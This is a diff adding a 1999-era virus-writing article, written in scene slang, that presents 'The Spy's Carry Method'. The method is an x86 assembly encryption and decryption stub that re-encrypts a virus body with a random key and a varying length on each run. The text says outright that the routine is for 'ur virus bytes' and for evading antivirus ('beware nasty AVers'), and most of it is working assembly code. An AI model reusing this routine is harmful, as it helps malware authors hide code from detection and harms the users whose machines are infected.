@@ -1,0 +1,113 @@
+; Brief Description: A New Way for Encryption
+; Date: Dunno, i ve coded it in 99 but i ve da idea before
+; Author: The Spy
+
+  One of da things that my sick mind ve developed since i ve decided
+code again is that new/nasty/putrefact n why not, kewl encryption
+routine. What does that encryption routine do is very simple, it will
+encrypt (use it as u want) ur virus bytes until da numbers of carries
+ve reached... ummm confuse
+  This produces that da encrypted zone change every run n for example
+a time it encrypts 50 bytes, n da another time it will encrypt only 20
+or 25, it changes every run :) Whattttt?? my english suxs, damn.
+  Here is da fuckin code.
+
+--[TSCM]--------------------------8<-----------------------------------
+
+;==================------ -  -  -      -           -                - ;
+; The Spy's Carry Method
+;==================------ -  -  -      -           -                - ;
+; cx := amount_cf_sets ; { cf = carry flag, u know, carry method... }
+; si := virus_body ;
+; di := si ;
+; bx := key ;
+; bp := virus_body_end ;
+; dx.usage := as counter ;
+; ax.usage := 'R U Kiddin Me?' ;
+; TSCM.usage := NULL ;
+; hehehe (syntax error) damn! (syntax error) :' (syntax error) end.
+;==================------ -  -  -      -           -                - ;
+
+	mov cl,cfsets
+	lea si,body
+	mov di,si
+	mov bl,key
+	lea bp,encrypt
+	xor dx,dx
+decr:
+	cmp cl,dl	; i ve finished by carry amounts?
+	jz body
+	cmp si,bp	; i ve finished by length?
+	jz body
+	clc
+
+	lodsb		; load encrypted byte
+	sub al,bl	; decrypt
+	stosb		; store decrypted byte
+
+	jc addone	; if carry its a new one folks! :)
+	jmp decr
+
+key	db	00h	; here goes da key, u know...
+cfsets	db	00h	; n here da carry flag sets amount
+
+addone:
+	inc dl		; its a new cfset, well dl++
+	jmp decr	; continue
+
+body:
+
+; .
+; .
+; ur code
+; .
+; .
+
+encrypt:
+	lea si,key		; si points to da key
+	in ax,40h		; get a 16 bit random number
+	db 0D5h,10h		; now, an aam hexadecimal, sets ah to 0
+	mov byte ptr [si],al	; n al:=(ah*10h)+al; key:=al;
+	mov bl,al		; move key to bl
+	in al,40h		; get an 8 bit random number
+	mov byte ptr [si+1],al	; chust place it in da cfsets variable
+	mov cl,al		; put cfsets in cl
+	lea bp,encrypt		; now, bp points to da end of da code
+	lea si,body		; to encrypt n si points to its begin
+	mov di,si		; di too
+	xor dx,dx		; 0 cfsets ve occured yet
+encr:
+	cmp cl,dl		; ok, da same as to decrypt
+	jz exit
+	cmp si,bp
+	jz exit
+	clc
+
+	lodsb
+	add al,bl	; but here u encrypt ;)
+	stosb
+
+	jc indl
+	jmp encr
+
+indl:
+	inc dl
+	jmp encr
+
+exit:
+
+; .
+; .
+; ur exit routine, or more code, as u want :)
+; .
+; .
+
+--[TSCM]--------------------------8<-----------------------------------
+
+  Do u want a sample program? Damn ok, here is carry.com that modifies
+itself each run n to show that it works fine, it shows da string 'TSCM
+Works!!'.
+  No bla bla, its plenty of code! What a description X) Its all folks!
+
+  The Spy,
+  beware nasty AVers
